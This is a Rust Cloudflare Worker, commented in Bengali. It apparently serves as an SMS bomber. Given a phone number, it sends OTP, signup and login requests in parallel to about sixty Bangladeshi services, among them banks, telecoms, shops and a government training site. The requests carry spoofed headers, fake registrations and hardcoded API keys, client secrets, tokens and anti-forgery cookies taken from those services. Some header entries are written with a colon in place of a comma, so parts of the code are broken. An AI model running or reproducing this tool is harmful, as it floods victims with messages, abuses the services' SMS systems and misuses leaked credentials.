use worker::*;
use serde_json::{json, Value};
use wasm_bindgen_futures::JsFuture;
use wasm_bindgen::JsValue;

// ══════════════════════════════════════════════════════
//  🚫 BLOCKED NUMBERS
//  যে number block করতে চাও সেটা এখানে যোগ করো
// ══════════════════════════════════════════════════════
const BLOCKED_NUMBERS: &[&str] = &[
    "01890183516",
    // "01700000000",
];

// ══════════════════════════════════════════════════════
//  CORS
// ══════════════════════════════════════════════════════
pub fn cors_headers() -> Headers {
    let mut h = Headers::new();
    h.set("Access-Control-Allow-Origin",  "*").unwrap();
    h.set("Access-Control-Allow-Methods", "GET, POST, OPTIONS").unwrap();
    h.set("Access-Control-Allow-Headers", "Content-Type").unwrap();
    h.set("Content-Type", "application/json").unwrap();
    h
}

// ══════════════════════════════════════════════════════
//  FIRE FUNCTION
//  name    → API এর নাম (response এ দেখাবে)
//  url     → API endpoint
//  payload → JSON body
//  extra_headers → &[("key", "value")] — API specific headers
//
//  ব্যবহার:
//  fire("নাম", "url", json!({...}), &[])                       ← extra header নেই
//  fire("নাম", "url", json!({...}), &[("Authorization", "Bearer TOKEN")])  ← header আছে
// ══════════════════════════════════════════════════════
async fn fire(
    name:          &'static str,
    url:           &'static str,
    payload:       Value,
    extra_headers: &[(&'static str, &'static str)],
) -> Value {
    let mut init = RequestInit::new();
    init.with_method(Method::Post);

    let mut h = Headers::new();
    // ── Default headers (সব API এর জন্য) ──
    h.set("Content-Type",    "application/json").unwrap();
    h.set("User-Agent",      "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36").unwrap();
    h.set("Accept",          "application/json, text/plain, */*").unwrap();
    h.set("Accept-Language", "en-US,en;q=0.9,bn;q=0.8").unwrap();
    h.set("Origin",          "https://www.google.com").unwrap();
    h.set("Referer",         "https://www.google.com/").unwrap();
    h.set("X-Requested-With","XMLHttpRequest").unwrap();

    // ── Extra headers (API specific) ──
    for (k, v) in extra_headers {
        let _ = h.set(k, v);
    }

    init.with_headers(h);
    init.with_body(Some(payload.to_string().into()));

    match Request::new_with_init(url, &init) {
        Ok(req) => match Fetch::Request(req).send().await {
            Ok(mut r) => {
                let s = r.status_code();
                let ok = s == 200 || s == 201 || s == 202;
                json!({
                    "api":    name,
                    "status": s,
                    "ok":     ok,
                    "url":    url,
                })
            }
            Err(e) => json!({"api": name, "status": 0, "ok": false, "url": url, "err": e.to_string()}),
        },
        Err(e) => json!({"api": name, "status": 0, "ok": false, "url": url, "err": e.to_string()}),
    }
}

// ══════════════════════════════════════════════════════
//  PARALLEL MACRO — সব API একসাথে fire করে
// ══════════════════════════════════════════════════════
macro_rules! parallel {
    ($($f:expr),+ $(,)?) => {{
        let js_promises = js_sys::Array::new();
        $(
            js_promises.push(
                &wasm_bindgen_futures::future_to_promise(async move {
                    let v = $f.await;
                    Ok(JsValue::from_str(&v.to_string()))
                })
            );
        )+
        let all        = js_sys::Promise::all(&js_promises);
        let results_js = JsFuture::from(all).await.unwrap_or(JsValue::NULL);
        let arr        = js_sys::Array::from(&results_js);
        let mut out: Vec<Value> = Vec::new();
        for i in 0..arr.length() {
            let s = arr.get(i).as_string().unwrap_or_default();
            out.push(serde_json::from_str(&s).unwrap_or(json!({"ok": false})));
        }
        out
    }};
}

// ══════════════════════════════════════════════════════
//  MAIN HANDLER
// ══════════════════════════════════════════════════════
pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
    let headers = cors_headers();

    if req.method() == Method::Options {
        return Ok(Response::empty()?.with_headers(headers));
    }
    if req.method() != Method::Post {
        return Ok(Response::error("POST Only", 405)?.with_headers(headers));
    }

    let body: Value = req.json().await.unwrap_or_default();
    let number_str = body
        .get("number")
        .and_then(|v| v.as_str())
        .unwrap_or("")
        .trim()
        .to_string();

    if number_str.is_empty() {
        return Ok(Response::ok(
            json!({"status": "error", "message": "Number missing"}).to_string(),
        )?.with_headers(headers));
    }

    // ── Block check ──
    let is_blocked = BLOCKED_NUMBERS.iter().any(|&b| {
        let n  = number_str.trim_start_matches('0');
        let bn = b.trim_start_matches('0');
        number_str == b
            || n == bn
            || format!("880{n}") == b
            || number_str == format!("880{bn}")
    });

    if is_blocked {
        return Ok(Response::ok(json!({
            "status":  "blocked",
            "message": "This number is protected.",
            "target":  number_str,
            "success": 0, "failed": 0, "total": 0, "results": []
        }).to_string())?.with_headers(headers));
    }

    // ── Number format helpers ──
    let number:  &'static str = Box::leak(number_str.clone().into_boxed_str());
    let bd_no:   &'static str = Box::leak(number_str.trim_start_matches('0').to_string().into_boxed_str());
    let bd_full: &'static str = Box::leak(format!("880{bd_no}").into_boxed_str());
    let plus_bd: &'static str = Box::leak(format!("+88{number_str}").into_boxed_str());

    // ══════════════════════════════════════════════════
    //  API LIST
    //
    //  Format:
    //  fire(
    //      "API নাম",
    //      "https://api.url/endpoint",
    //      json!({"key": value}),
    //      &[                                   ← extra headers (না থাকলে &[] দাও)
    //          ("Header-Name", "Header-Value"),
    //      ]
    //  ),
    // ══════════════════════════════════════════════════
let api_results = parallel![

    // ── Shadhin Music (ঠিক আছে) ──
    fire("Shadhin Music",
        "https://coreapi.shadhinmusic.com/api/v5/otp/OtpRobiReq",
        json!({"msisdn": bd_full, "shortcode": 16235, "servicename": "Shadhin Music"}),
        &[]
    ),

    // ── Khaodao (Eat‑Z) ──
    fire("Khaodao",
        "https://api.eat-z.com/auth/customer/app-connect",
        json!({"username": plus_bd}),
        &[("User-Agent", "okhttp/4.12.0")]   // override default
    ),

    // ── Walton Plaza ──
    fire("Walton Plaza",
        "https://waltonplaza.com.bd/api/auth/otp/create",
        json!({"auth": {"countryCode": "880", "deviceUuid": "ee757830-f639-12f0-9f4d-2f972746fhg", "phone": bd_no}, "captchaToken": "recapcha"}),
        &[]
    ),

    // ── Apex4u ──
    fire("Apex4u",
        "https://api.apex4u.com/api/auth/login",
        json!({"phoneNumber": number}),
        &[]
    ),

    // ── Nexo Pat ──
    fire("Nexo Pat",
        "https://host03pet.nexopet.com/api/v1.0/users/send-otp",
        json!({"phone": number}),
        &[("Origin": "https://www.nexopet.com")]
    ),

    // ── AWS POC ──
    fire("AWS POC",
        "https://8t09wa0n0a.execute-api.ap-south-1.amazonaws.com/poc/api/v1/otp/send",
        json!({"phone": number}),
        &[]
    ),

    // ── Otithee ──
    fire("Otithee",
        "https://gateway.otithee.com/api/v1/generate-otp",
        json!({"request_type": "registration", "mobile_number": number}),
        &[]
    ),

    // ── Quizgiri ──
    fire("Quizgiri",
        "https://developer.quizgiri.xyz/api/v2.0/send-otp",
        json!({"country_code": "+88", "phone": number}),
        &[
            ("x-api-key", "gYsiNSVBDuCt8yMUXpF06iQ1eDrMGv6G"),
            ("User-Agent", "Dart/2.12 (dart:io)")
        ]
    ),

    // ── Mojaru ──
    fire("Mojaru",
        "https://new.mojaru.com/api/student/login",
        json!({"mobile_or_email": number}),
        &[("Content-Type", "application/x-www-form-urlencoded")]
    ),

    // ── GP MyGP ──
    fire("GP MyGP",
        "https://appcity.grameenphone.com/proxy/v2/user/session/get-otp",
        json!({"mobileNumber": number}),
        &[("channel", "web")]
    ),

    // ── Upay ──
    fire("Upay",
        "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/",
        json!({"wallet_number": number, "geo_location": {"lat": 23.8979093, "long": 89.1356346}, "referral": "", "firebase_token": "e7XC0AWRR5C6rGMm6yCaZ8:APA91bHnbvs1bA_qXXb55W9GmsKmuzAUkgaR770HBH9hZCLjFV6HCejAsRGggvnD7c5dv2q_pOAdwY1peeTlzzn49cjPESTZ0NdR-bIhwe9_6of6rosH0AI", "device_uuid": "c65m117a8cbf5b1851b29f8b", "mno": "Robi"}),
        &[]
    ),

    // ── Chorki ──
    fire("Chorki",
        "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en",
        json!({"number": plus_bd}),
        &[("Origin", "https://www.chorki.com")]
    ),

    // ── Deepto Play ──
    fire("Deepto Play",
        "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en",
        json!({"number": plus_bd}),
        &[("Origin", "https://www.deeptoplay.com")]
    ),

    // ── RedX ──
    fire("RedX",
        "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp",
        json!({"phoneNumber": number}),
        &[("Referer", "https://redx.com.bd/")]
    ),

    // ── Bohubrihi ──
    fire("Bohubrihi",
        "https://bb-api.bohubrihi.com/public/activity/otp",
        json!({"phone": number, "intent": "login"}),
        &[]
    ),

    // ── GP Shop ──
    fire("GP Shop",
        "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp",
        json!({"phone": number, "language": "en", "email": ""}),
        &[]
    ),

    // ── Shikho (public/activity/otp) ──
    fire("Shikho",
        "https://api.shikho.com/public/activity/otp",
        json!({"phone": number, "intent": "ap-discount-request"}),
        &[
            ("Accept", "application/json,application/json"),
            ("Build-Version", "(450) 4.5.0")
        ]
    ),

    // ── iEducation BD ──
    fire("iEducation BD",
        "https://www.ieducationbd.com/api/account/check_user",
        json!({"mobile": number}),
        &[]
    ),

    // ── Bangladeshi Matrimony ──
    fire("Bangladeshi Matrimony",
        "https://www.bangladeshimatrimony.com/register/editmobileno.php",
        json!({"mobileNo": number}),
        &[]
    ),

    // ── Easy BD ──
    fire("Easy BD",
        "https://core.easy.com.bd/api/v1/registration",
        json!({"password": "445566", "password_confirmation": "445566", "name": "Team Dangerous", "mobile": number, "referrer_key": "", "email": "dangerousboytushar@gmail.com"}),
        &[
            ("Host", "core.easy.com.bd"),
            ("Connection", "keep-alive"),
            ("lang", "en"),
            ("device-key", "48b1f7061f48c950090220f62128b2c3")
        ]
    ),

    // ── MyGuardian BD (original) ──
    fire("MyGuardian BD",
        "https://gliapp.myguardianbd.com/auth-gate/api/access/send-otp",
        json!({"mobileNumber": number, "type": null}),
        &[]
    ),

    // ── Gorilla Move ──
    fire("Gorilla Move",
        "https://api.gorillamove.com/api/v1/core/account/phone_login",
        json!({"phone_number": number, "step": 1}),
        &[]
    ),

    // ── Munchies BD ──
    fire("Munchies BD",
        "https://api.munchies.com.bd/parse/functions/generateOtp",
        json!({"phone": number}),
        &[
            ("X-Parse-Application-Id", "munchiesbd"),
            ("X-Parse-REST-API-Key",   "munchiesbd"),
             ("x-parse-application-id": "food"),
        

        ]
    ),

    // ── NRB Bazaar ──
    fire("NRB Bazaar",
        "https://www.nrbbazaar.com/Customer/RequestOtpForRegistration",
        json!({"phoneNumber": number, "email": "example@gmail.com", "__RequestVerificationToken": "CfDJ8OTdK55f1KtKpMVto1XODz36P2tWXfyeot9aYuxWqkd81qABD_JFUva73ce2L5ftYmqCgwInZKUHisKU3mWb6DkYgBFDg4QIej8YwHP3BQ3fQvgBfc6mbMjVua7p-AT4MEPtgYhLexJmTxl7enCosqA"}),
        &[
            ("Content-Type", "application/x-www-form-urlencoded"),
            ("Cookie", ".Nop.Antiforgery=CfDJ8N5UM1Mg0_JFs4qu7TCIBSzGu689vm8mbvSPQ743hQSg8CQN0NF_XzfjEsi78OgkEPagdV_jE0-Bv17i3ToM1axTnWqbYcicXyGSwLVIJt-Jpak2l8yoNfuDZsgWG4Hlg4xPW4OOpCtcsf5xmMkdvFk")
        ]
    ),

    // ── Medico Bio ──
    fire("Medico Bio",
        "https://api.v2.medico.bio/patient/passwordless-login",
        json!({"phoneNumber": number, "deviceId": number, "channel": "web", "userType": "patient", "type": "newUser"}),
        &[("Origin", "https://medico.bio")]
    ),

    // ── Paymaster BD ──
    fire("Paymaster BD",
        "https://ap.paymasterbd.net/login_registration/",
        json!({"phone_number": number, "fcm_key": "", "device_id": "b5f0985eb84c4bfa", "sms_hash_code": "s2//QkN6BpW"}),
        &[
            ("Content-Type", "application/x-www-form-urlencoded"),
            ("User-Agent", "okhttp/3.14.9")
        ]
    ),

    // ── Relaxy BD ──
    fire("Relaxy BD",
        "https://dev.api.relaxy.com.bd/api/v1/otp/send",
        json!({"phoneNumber": plus_bd, "appSignature": "appSignature"}),
        &[
            ("User-Agent", "Dart/2.19 (dart:io)"),
            ("x-api-key", "6yjOGvakSbHjA64NGqo7m25TBC4WX8BauAXEP3dX")
        ]
    ),

    // ── Porter BD ──
    fire("Porter BD",
        "https://customerapp-gateway-ktor.prod.porter.ae/onboarding/customer/signup",
        json!({"phone": number}),
        &[
            ("country", "bd"),
            ("preferred-languages", "{\"app_language\":\"en\"}"),
            ("brand", "porter"),
            ("source", "android"),
            ("version-name", "6.7.0"),
            ("custom-app-version-code", "410"),
            ("client-request-uuid", "88c7743e-d714-4735-ad05-339e43cf8e73"),
            ("installation-id", "0eb9e8bc-9725-4bd5-a382-fe92c716b3c7"),
            ("app-session-id", "4699341c-6f94-4481-af99-041b43d24623"),
            ("user-agent", "Dalvik/2.1.0"),
            ("content-type", "application/json")
        ]
    ),

    // ── FSIB Freedom ──
    fire("FSIB Freedom",
        "https://freedom.fsiblbd.com/verifidext/api/CustOnBoarding/VerifyMobileNumber",
        json!({"AccessToken": "", "TrackingNo": "", "mobileNo": number, "otpSms": "", "product_id": "131", "requestChannel": "MOB", "trackingStatus": 5}),
        &[("User-Agent", "okhttp/4.10.0")]
    ),

    // ── Fundesh ──
    fire("Fundesh",
        "https://fundesh.com.bd/api/auth/generateOTP",
        json!({"msisdn": bd_no}),
        &[("Origin", "https://fundesh.com.bd")]
    ),

    // ── Ghoori Learning ──
    fire("Ghoori Learning",
        "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web",
        json!({"mobile_no": number}),
        &[
            ("Host": "api.ghoorilearning.com"),
            ("Referer", "https://ghoorilearning.com/")]
    ),

    // ── ExpressHub ──
    fire("ExpressHub",
        "https://expresshub.com.bd/User/CreateNewUser",
        json!({"_UID": number, "_UNAME": "0", "_MAIL": "0", "_PHONE": "0", "_PASS": "0", "_TYPE": "1"}),
        &[
            ("Content-Type", "application/x-www-form-urlencoded"),
            ("Origin", "https://expresshub.com.bd")
        ]
    ),

    // ── Pharmaid RX ──
    fire("Pharmaid RX",
        "https://shop.pharmaid-rx.com/api/sendSMSRegistration",
        json!({"mobileNumber": number}),
        &[("User-Agent", "Mozilla/5.0"),
         ("Host": "shop.pharmaid-rx.com")]
    ),

    // ── Practice Club ──
    fire("Practice Club",
        "https://www.practiceclub.net/api/register",
        json!({"contact_no": number}),
        &[("User-Agent", "okhttp/4.9.0")]
    ),

    // ── Quality Foods ──
    fire("Quality Foods",
        "https://admin.qualityfoods.com.bd/api/auth/check-phone",
        json!({"phone": number, "is_sign_in": 0, "login_type": "phone"}),
        &[]
    ),

    // ── PBS BD ──
    fire("PBS BD",
        "https://pbs.com.bd/login/?handler=UserGetOtp",
        json!({"UserName": "Teamdanderous", "UserPassword": "Tushar", "MobileNo": number}),
        &[
            ("XSRF-Token", "CfDJ8C8FhGbSUB1CplCwhmaw48FrjIGNq5sPRk0G6VzBicZtPJrEXDCoqGMiBTb3Fetxypt-480avEXqJS_WJVdEWQeDCz0mKIQO4odODIqIopHM8qh50R7CF3bOGHOtF22Pt-pgeyMhHQTk2t2inqJMRyw"),
            ("Cookie", ".AspNetCore.Antiforgery.B6RPubf2LMI=CfDJ8C8FhGbSUB1CplCwhmaw48HSKnE-hppep13XT5NAyk3laCHJb_oP0B1wPBZQP-hzP8Z2CAclzIeEqkFAMeWJS8xWzyiIMY_sMlsO7WzVcxmONd9WUDnzazvUlK9zFOY8h6Pwx1xsDD9fgtr2ltr9qHE;")
        ]
    ),

    // ── Dutch Bangla NX ──
    fire("Dutch Bangla NX",
        "https://nxpay1.dutchbanglabank.com/user/register",
        json!({"aspId": "5678", "locale": "EN", "msisdn": number, "registrationUserId": number, "tcidList": [50], "telcoId": "GP"}),
        &[
            ("X-KM-User-AspId", "5678"),
            ("X-KM-Accept-language", "en"),
            ("X-KM-OS-SERVICE-TYPE", "GMS"),
            ("X-KM-User-Agent", "ANDROID/100046615"),
            ("Content-Length", "276"),
            ("Host", "nxpay1.dutchbanglabank.com"),
            ("User-Agent", "okhttp/4.9.3")
        ]
    ),

    // ── One Fish ──
    fire("One Fish",
        "https://api.onefish.app/api/auth/user/sendotp",
        json!({"phone": number}),
        &[]
    ),

    // ── Hishabee ──
    fire("Hishabee",
        "https://distribution.hishabee.business/api/app/v1/auth/number-check",
        json!({"mobile_number": number}),
        &[]
    ),

    // ── English Moja ──
    fire("English Moja",
        "https://api.englishmojabd.com/api/v1/auth/login",
        json!({"phone": plus_bd}),
        &[("User-Agent", "Dart/3.2 (dart:io)")]
    ),

    // ── Sundarban Courier ──
    fire("Sundarban Courier",
        "https://api-gateway.sundarbancourierltd.com/graphql",
        json!({"operationName": "CreateAccessToken", "variables": {"accessTokenFilter": {"userName": number}}, "query": "mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode } }"}),
        &[("Origin", "https://customer.sundarbancourierltd.com")]
    ),

    // ── Easy BD Reg ──
    fire("Easy BD Reg",
        "https://core.easy.com.bd/api/v1/registration",
        json!({"name": "Rahat", "email": "chowa@gmail.com", "mobile": number, "password": "123456", "password_confirmation": "123456", "device_key": "48b1f7061f48c950090220f62128b2c3"}),
        &[
            ("Host", "core.easy.com.bd"),
            ("Connection", "keep-alive"),
            ("lang", "en"),
            ("device-key", "48b1f7061f48c950090220f62128b2c3")
        ]
    ),

    // ── Osud Kini ──
    fire("Osud Kini",
        "https://api.osudkini.com/api/otp/generate-otp",
        json!({"phoneNo": number}),
        &[("Connection", "keep-alive")]
    ),

    // ── ABC Lit ──
    fire("ABC Lit",
        "https://abclit.com/api/sendOTP",
        json!({"recipientNo": number, "code": 1234}),
        &[]
    ),

    // ── Pathao Auth ──
    fire("Pathao Auth",
        "https://api.pathao.com/v2/auth/register",
        json!({"country_prefix": "880", "national_number": bd_no, "country_id": 1}),
        &[
            ("app-agent", "ride/android/478"),
            ("android-os", "10"),
            ("user-agent", "okhttp/4.12.0")
        ]
    ),

    // ── Focallure BD ──
    fire("Focallure BD",
        "https://store.focallurebd.com/api/v1/1/ecom/auth/getCode",
        json!({"mobile": number}),
        &[("user-agent", "Dart/2.14 (dart:io)")]
    ),

    // ── Wholesale Plus ──
    fire("Wholesale Plus",
        "https://admin.wholesaleplus.com.bd/api/send-otp/",
        json!({"email": number, "regi": true}),
        &[]
    ),

    // ── Motion View ──
    fire("Motion View",
        "https://api.motionview.com.bd/api/send-otp-phone-signup",
        json!({"phone": number}),
        &[("content-length", "23")]
    ),

    // ── QPay BD ──
    fire("QPay BD",
        "https://identity01.qpaybd.com.bd/api/v1/verification/phone",
        json!({"Id": number}),
        &[("user-agent", "Dart/3.2 (dart:io)")]
    ),

    // ── Amiprobashi ──
    fire("Amiprobashi",
        "https://www.amiprobashi.com/api/v7/en/auth/send-otp",
        json!({"device_type": "1", "username": plus_bd, "for": "1", "type": "1", "bd_number": "1"}),
        &[
            ("android-app-version", "4.5.0"),
            ("content-type", "application/x-www-form-urlencoded"),
            ("user-agent", "okhttp/4.10.0")
        ]
    ),

    // ── Bepari App ──
    fire("Bepari App",
        "https://api.bepari.app/bestfreshfarm/api/V1.4/access-control/user/registerOtp",
        json!({"client_id": 4, "client_secret": "zCzOixaOJ4JywQr1VsowGZhCaEbZ49WLxweNBgPK", "mobile_no": number}),
        &[("Origin", "https://www.bestfreshfarm.com")]
    ),

    // ── Training Gov BD ──
    fire("Training Gov BD",
        "https://training.gov.bd/backoffice/api/user/sendOtp",
        json!({"mobile": number}),
        &[]
    ),

    // ── ILYN Global ──
    fire("ILYN Global",
        "https://api.ilyn.global/auth/signup",
        json!({"phone": {"code": "BD", "number": number}, "provider": "sms"}),
        &[
            ("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundarylKIx6ZhornTyt7tA"),
            ("User-Agent", "Mozilla/5.0")
        ]
    ),

    // ── Klassy BD ──
    fire("Klassy BD",
        "https://api.klassy.com.bd/api/v2/public/user/register/send/otp",
        json!({"phone": number}),
        &[]
    ),

    // ── Rangs Motors ──
    fire("Rangs Motors",
        "https://api.rangsmotors.com/",
        json!({"u_num": number}),
        &[("Origin", "https://www.garimela.com")]
    ),

    // ── WinBaji ──
    fire("WinBaji",
        "https://userapi.fairbet91.com/api/RegisterUser/GenerateOTPV2",
        json!({"Mobile": number, "SiteCode": "WBJ"}),
        &[("Origin", "https://winbaji.com")]
    ),

    // ── Walton Amar Awaz ──
    fire("Walton Amar Awaz",
        "https://walton-amar-awaz-prod.com/api/user/signup",
        json!({"email": "", "fbId": "", "fullName": "User", "gId": "", "phone": number}),
        &[
            ("accept", "application/json"),
            ("version-code", "1.4.7"),
            ("authorization", "Bearer"),
            ("user-agent", "okhttp/4.7.2")
        ]
    ),

    // ── ACS Future School ──
    fire("ACS Future School",
        "https://auth.acsfutureschool.com/api/v1/otp/send",
        json!({"phone": number}),
        &[]
    ),

    // ── Meena Bazar ──
    fire("Meena Bazar",
        "https://meenabazardev.com/api/mobile/front/send/otp",
        json!({"CellPhone": number, "type": "login"}),
        &[("Content-Type", "application/x-www-form-urlencoded")]
    ),



        // ════════════════════════════════════════════
        //  নতুন API যোগ করার format:
        //
        //  fire("API নাম",
        //      "https://api.url/endpoint",
        //      json!({"phone": number}),  ← অথবা bd_no / bd_full / plus_bd
        //      &[]                        ← extra header নেই
        //  ),
        //
        //  extra header সহ:
        //  fire("API নাম",
        //      "https://api.url/endpoint",
        //      json!({"phone": number}),
        //      &[
        //          ("Authorization", "Bearer YOUR_TOKEN"),
        //          ("X-App-Key",     "YOUR_APP_KEY"),
        //      ]
        //  ),
        // ════════════════════════════════════════════

    ];

    let success = api_results.iter()
        .filter(|r| r["ok"].as_bool().unwrap_or(false))
        .count() as u32;
    let failed = api_results.len() as u32 - success;

    Ok(Response::ok(json!({
        "status":  "executed",
        "target":  number_str,
        "success": success,
        "failed":  failed,
        "total":   success + failed,
        "results": api_results,
    }).to_string())?.with_headers(headers))
}
